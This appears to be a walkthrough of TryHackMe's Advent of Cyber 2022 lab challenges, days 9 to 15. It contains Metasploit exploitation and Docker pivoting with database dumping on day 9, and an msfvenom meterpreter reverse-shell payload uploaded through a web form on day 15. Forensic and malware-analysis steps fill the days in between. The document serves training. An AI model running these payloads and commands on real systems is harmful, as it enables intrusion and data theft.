# [Advent of Cyber 2022](https://tryhackme.com/room/adventofcyber4)

> Get started with Cyber Security in 24 Days - learn the basics by doing a new, beginner-friendly security challenge every day leading up to Christmas.

## Day 9: Dock the halls

scan the target

```
nmap -sV 10.10.249.228
```

![image](https://user-images.githubusercontent.com/90561566/206836994-a0fb95a9-acae-4ccf-ba35-ca6528a21ab3.png)

go to webpage, you will see it use Laravel framework

![image](https://user-images.githubusercontent.com/90561566/206840506-be217bdf-43cf-476f-9374-f90124b29f70.png)

search for exploit

![image](https://user-images.githubusercontent.com/90561566/206840698-57f8cc20-b922-498f-ba11-b61d7d792e8f.png)

```
msfconsole
```

![image](https://user-images.githubusercontent.com/90561566/206837648-bd28931c-0d84-4f9f-ade3-97692ff1269f.png)

type `info` and you will see cve here

![image](https://user-images.githubusercontent.com/90561566/206840790-4eede273-2564-40a2-b259-e541c3b1e38b.png)

```
set HttpClientTimeout 20
set rhosts 10.10.249.228
check
```

![image](https://user-images.githubusercontent.com/90561566/206837806-531454b0-ff76-47ea-80b5-e149fa8df684.png)

```
set lhost 10.8.0.74
run
```

![image](https://user-images.githubusercontent.com/90561566/206837939-35b425b2-0568-4b05-890b-43a01299d78d.png)

background the session

![image](https://user-images.githubusercontent.com/90561566/206837988-e6642782-7f7e-4a54-afa4-acd1c59a11b0.png)

update to meterpreter

```
sessions -u 1
sessions -i 2
```

![image](https://user-images.githubusercontent.com/90561566/206838093-8285c2ce-5860-45f9-9d5e-2c69a4c5bc90.png)

explore the application

![image](https://user-images.githubusercontent.com/90561566/206838159-9969a7e2-cdce-4ce3-a8dc-0d9f3081e70d.png)

![image](https://user-images.githubusercontent.com/90561566/206838186-643b9f42-691c-4d12-bfd1-5d21bff1b288.png)

resolve hostname to ip

```
resolve webservice_database
```

background session and config route table for pivoting

```
route add 172.28.101.51/32 2
```

![image](https://user-images.githubusercontent.com/90561566/206838345-54f3e8f8-8a20-4a40-b71b-2ac102b34280.png)

We can also see, due to the presence of the /.dockerenv file, that we are in a docker container. 

By default, Docker chooses a hard-coded IP to represent the host machine.

```
route add 172.17.0.1/32 2
```

dump the database schema

```
use auxiliary/scanner/postgres/postgres_schemadump
set rhosts 172.28.101.51
run
```

![image](https://user-images.githubusercontent.com/90561566/206839175-3d006527-4439-4a7f-8e43-9960f6d6fa9e.png)

```
use auxiliary/admin/postgres/postgres_sql
set rhosts 172.28.101.51
set database postgres
set sql 'select * from users'
run
```

![image](https://user-images.githubusercontent.com/90561566/206839428-c7603330-bbd1-4d31-82b7-c2bc8c8a269c.png)

create socks proxy

```
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
set srvport 9050
set version 4a
run
```

![image](https://user-images.githubusercontent.com/90561566/206839549-64059aea-be38-444c-ab6f-f9da523b2996.png)

now you can use proxy through

```
proxychains nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1
```

![image](https://user-images.githubusercontent.com/90561566/206839554-7ee40680-c4dd-49d0-8de1-8431fa20d1d6.png)

SSH into the host machine from the Docker container

```
use auxiliary/scanner/ssh/ssh_login
set username santa
set password p4$$w0rd
set rhosts 172.17.0.1
run
```

now interact with opened session to grab flag

![image](https://user-images.githubusercontent.com/90561566/206840056-96f5cd4d-5e12-43f3-a8bf-6053b31c7752.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/206840820-1d4b507f-fefa-495d-ae4e-c37dc1053558.png)

![image](https://user-images.githubusercontent.com/90561566/206840829-9634a7c4-c544-4e1a-a526-92f18f2fd401.png)

## Day 10: You're a mean one, Mr. Yeti

open a game at https://10.10.12.38:443

![image](https://user-images.githubusercontent.com/90561566/206893338-e7e236eb-3d73-435e-993b-f95b2634a6b2.png)

turn right and meet the guard near the door, he requires you to quess a number

![image](https://user-images.githubusercontent.com/90561566/206893407-23ead003-1731-4b1c-b031-872dcae0d8c2.png)

enter anything you want, he will show his first number, use it on cetus

![image](https://user-images.githubusercontent.com/90561566/206893584-93ff3eac-7c4a-48b7-9480-d2d79b2d9fe9.png)

bookmark it, talk to the guard again and answer with the new number (convert it to decimal before)

![image](https://user-images.githubusercontent.com/90561566/206893681-915060f7-42c6-4c56-8749-3006b08699b5.png)

you can change it to other number before answering (0 for easiest)

![image](https://user-images.githubusercontent.com/90561566/206894039-2dba8e8e-3983-40f3-9c47-97e70aea0003.png)

go ahead, it's a big challenge for you

![image](https://user-images.githubusercontent.com/90561566/206893782-02e62d34-75ae-4c25-a146-4faa13afdf7b.png)

hmm, you can't pass it, i think 2 ways to do that, once you can stop the snowball, or you need to be invincible

![image](https://user-images.githubusercontent.com/90561566/206894233-165ac268-b31a-4440-a572-6a1bbc55e96a.png)

start new search with no-value EQ flag, reduce your heart with 1 hit, then continue check with no-value LE flag

![image](https://user-images.githubusercontent.com/90561566/206894317-22fba31e-af43-4428-ae53-d392d7ffc335.png)

until you revive, check with GT flag, now you know your max heart EQ to 100

![image](https://user-images.githubusercontent.com/90561566/206894352-ef3c6996-7b89-442c-a8b5-a286a40e3872.png)

continue you will find out 3 record, the 2 same are correct, bookmark them

![image](https://user-images.githubusercontent.com/90561566/206894186-16d28a8a-ab35-42a7-bea7-1464f5eac0f3.png)

after testing with reducing my heart, i know the first one store current heart, the other store displayed heart

![image](https://user-images.githubusercontent.com/90561566/206894472-0ad70b6e-f9bd-4da5-9eea-9059a86c301b.png)

in other words, variable 2 is a reference to variable 1, but you can change both to 1000 or freeze the first var

![image](https://user-images.githubusercontent.com/90561566/206894629-7a3f5092-a608-4c2c-b13b-bc8e16730f9d.png)

talk to yeti, here is your flag

![image](https://user-images.githubusercontent.com/90561566/206894661-766054f4-119b-451d-b231-665e0554ee65.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/206894791-261f36a0-8fff-4bc9-89d5-0efd6d8d1c5d.png)

## Day 11: Not all gifts are nice

firstly, scan the os

```
python3 vol.py -f workstation.vmem windows.info
```

![image](https://user-images.githubusercontent.com/90561566/207078031-70e6bcb4-ecc3-434b-95d9-ae67c0709967.png)

scan the processes

```
python3 vol.py -f workstation.vmem windows.pslist
```

you will see a gift that santa left for us

```
python3 vol.py -f workstation.vmem windows.dumpfiles --pid 2040
```

![image](https://user-images.githubusercontent.com/90561566/207079495-e5641d24-feeb-4836-9964-723ab9bc7c2f.png)

## Day 12: Forensic McBlue to the REVscue!

open the file with DIE

![image](https://user-images.githubusercontent.com/90561566/207519345-c35e03b0-6390-4199-bbb0-25b660bec2bc.png)

open cmd and cd to Desktop/"Malware Sample"

```
capa mysterygift
upx -d mysterygift
```

![image](https://user-images.githubusercontent.com/90561566/207520078-f7872da1-b1b3-40cd-bab4-7fb3f60b10ba.png)

```
del mysterygift.viv
capa mysterygift
```

you will see the result from capa

![image](https://user-images.githubusercontent.com/90561566/207520358-4d9de1c4-c13e-4094-a9f0-66d7e1e7d76a.png)

![image](https://user-images.githubusercontent.com/90561566/207520473-4d97fa2b-19e1-4220-b601-84607cd8d7f6.png)

now move into dynamic analysis

```
mv mysterygift mysterygift.exe
```

open process monitor and analysis regkey, then run the mysterygift.exe

![image](https://user-images.githubusercontent.com/90561566/207521517-e7b6a298-cf1f-4b0f-a92e-ea91c58e25be.png)

right click and exclude all operation, left only RegCreateKey and RegSetValue

![image](https://user-images.githubusercontent.com/90561566/207521758-90ab625d-7d54-45a5-95d5-4240a351432e.png)

at RegSetValue, i can see one suspicious path

![image](https://user-images.githubusercontent.com/90561566/207522159-b0e079fd-4f89-41b4-ba27-f9402f091346.png)

go to that path and edit to see the content of wishes.bat

![image](https://user-images.githubusercontent.com/90561566/207522435-d25c67e2-d0e5-4041-8759-38952609d551.png)

next analysis the file operation and include CreateFile

![image](https://user-images.githubusercontent.com/90561566/207523435-2b63e7c5-5a8c-4797-ae0d-7ca94457e415.png)

continue with analysing network operation

![image](https://user-images.githubusercontent.com/90561566/207524682-12561a9c-0f76-44b6-8d31-470f6dd3202b.png)

filter by strings with DIE is the same

![image](https://user-images.githubusercontent.com/90561566/207525118-a0329755-9703-47a4-b8cc-933f974ad4b2.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/207525586-8ff4280f-4886-4147-910f-5cddddcc5e37.png)

![image](https://user-images.githubusercontent.com/90561566/207525655-dcb16d87-9909-4244-81b7-148f74700f4c.png)

## Day 13: Simply having a wonderful pcap time

first, open the pcap file, view the "Protocol Hierarchy" menu

![image](https://user-images.githubusercontent.com/90561566/207802009-f93123c3-7104-4f26-8ecd-06be50910449.png)

look the Conversations menu, it's suspicious at port 3389 (rdp)

![image](https://user-images.githubusercontent.com/90561566/207802232-1a1f9e57-8085-4e23-8ddd-3b06cf62b913.png)

filter by dns, there are 2 domains found

![image](https://user-images.githubusercontent.com/90561566/207802771-1ba5c3a7-03ff-4e19-b581-b62707ab46e5.png)

filter by http

![image](https://user-images.githubusercontent.com/90561566/207803018-e194dcd7-c56c-4d10-8eb0-a0fdd9f0f6d2.png)

![image](https://user-images.githubusercontent.com/90561566/207803580-d5ff19c4-49d1-45b9-ac93-1ab078a888e5.png)

export object by http

![image](https://user-images.githubusercontent.com/90561566/207803677-e41c3f96-cbbd-4d0d-8c70-71bc29277234.png)

```
sha256sum mysterygift.exe
```

search in virustotal, switch to behavior tab, navigate to ip address, there are 3 ip with 443 protocol

![image](https://user-images.githubusercontent.com/90561566/207804311-72fdc816-21f1-48c8-a39c-044f0209474e.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/207804961-de3ff6af-de4c-4932-9b49-45ab293caf7e.png)

![image](https://user-images.githubusercontent.com/90561566/207805029-a674740f-7231-42ba-aa94-4ba76fa8e962.png)

![image](https://user-images.githubusercontent.com/90561566/207805059-eaa48e02-c8a0-4cf1-987c-691747e57570.png)

## Day 14: I'm dreaming of secure web apps

view the webapp, login with given credentials

![image](https://user-images.githubusercontent.com/90561566/208044116-88da0df1-a6a1-4383-82ef-01110e3a73d3.png)

change the url increase gradually to use 105

![image](https://user-images.githubusercontent.com/90561566/208044296-9b240d0c-deb8-4e15-83de-1020f1d6161a.png)

click on the image, new url to find for you

![image](https://user-images.githubusercontent.com/90561566/208044548-d072a533-803c-4ab3-ba92-9d50b812aedb.png)

do the same, you will see the image 100

![image](https://user-images.githubusercontent.com/90561566/208044650-f0b5e8dd-555d-4081-80cd-1bbf71802c78.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/208044827-e3747aee-51dc-499e-afd7-35f9564d33cb.png)

## Day 15: Santa is looking for a Sidekick

first, i can see the webapp is allowing with all of file uploads, create a webshell

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.127.91 LPORT=4444 -f exe -o cv.exe
```

![image](https://user-images.githubusercontent.com/90561566/208070483-84e61b67-9ef7-498e-8008-0321c07bdd5a.png)

open listener

```
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.127.91; set LPORT 4444; exploit"
```

and upload cv.exe to santa's webapp, and wait about 1 minute

![image](https://user-images.githubusercontent.com/90561566/208071272-a4b6fa23-e0d3-4b54-98c0-0c30778c370b.png)

list the users directory

![image](https://user-images.githubusercontent.com/90561566/208071820-12856702-70f6-437d-98d0-a707395857be.png)

```
cd C:/Users/HR_Elf/Documents
cat flag.txt
```

![image](https://user-images.githubusercontent.com/90561566/208072001-b6d06d6c-ba49-456d-b8a2-4b69d4ea98fc.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/208072485-28dfba93-d6f4-4b31-a4d6-d1d53d7181a9.png)
